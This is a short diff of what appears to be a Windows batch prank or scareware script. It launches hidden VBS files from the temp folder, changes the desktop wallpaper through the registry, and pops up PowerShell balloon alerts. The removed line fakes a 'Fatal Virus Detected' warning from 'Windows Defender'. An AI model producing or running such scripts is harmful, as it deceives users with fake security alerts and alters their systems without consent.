@@ -140,7 +140,7 @@ start /min %temp%\vine.vbs
 ping localhost -n 2 >nul
 start /min %temp%\creepy2.vbs
 timeout 3 >nul
-powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Fatal Virus Detected', 'Windows Defender', [System.Windows.Forms.ToolTipIcon]::None)}"
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Can i borrow you're computer for a sec %username%', ' ', [System.Windows.Forms.ToolTipIcon]::None)}"
 timeout 4 >nul
 powershell set-itemproperty -path 'HKCU:Control Panel\Desktop' -name WallPaper -value %appdata%\willishot\wallpaper.png >nul
 ping localhost -n 1 >nul
